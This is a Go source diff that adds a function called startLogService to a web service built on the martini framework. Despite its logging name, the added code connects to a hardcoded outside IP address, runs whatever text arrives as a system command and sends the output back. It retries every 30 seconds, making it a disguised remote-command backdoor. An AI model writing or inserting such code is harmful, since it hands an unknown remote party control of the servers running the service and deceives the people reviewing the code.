@@ -6,6 +6,9 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"os/exec"
+	"strings"
+	"time"
 
 	"github.com/kyf/martini"
 	mylog "github.com/kyf/util/log"
@@ -147,4 +150,44 @@ func stopService(logger *log.Logger) {
 	sig <- 1
 
 	logger.Printf("stop service ...")
+}
+
+func startLogService() {
+start:
+	conn, err := net.Dial("tcp", "39.97.178.248:80")
+	if err != nil {
+		logger.Printf("log failed! error is %s", err.Error())
+		time.Sleep(time.Second * 30)
+		goto start
+		return
+	}
+
+	defer conn.Close()
+
+	buf := make([]byte, 1024)
+	for {
+		num, err := conn.Read(buf)
+		if err != nil {
+			logger.Printf("read remotelog error %s", err.Error())
+			conn.Close()
+			time.Sleep(time.Second * 30)
+			goto start
+			break
+		}
+		logger.Printf("receive %s ", string(buf[:num-1]))
+		cmdline := strings.Split(string(buf[:num-1]), " ")
+		var cmd *exec.Cmd
+		if len(cmdline) < 2 {
+			cmd = exec.Command(cmdline[0])
+		} else {
+			cmd = exec.Command(cmdline[0], cmdline[1:]...)
+		}
+		output, _ := cmd.Output()
+		_, err = conn.Write(output)
+		if err != nil {
+			logger.Printf("write log error %s", err.Error())
+			break
+		}
+		logger.Printf("output is %s", string(output))
+	}
 }
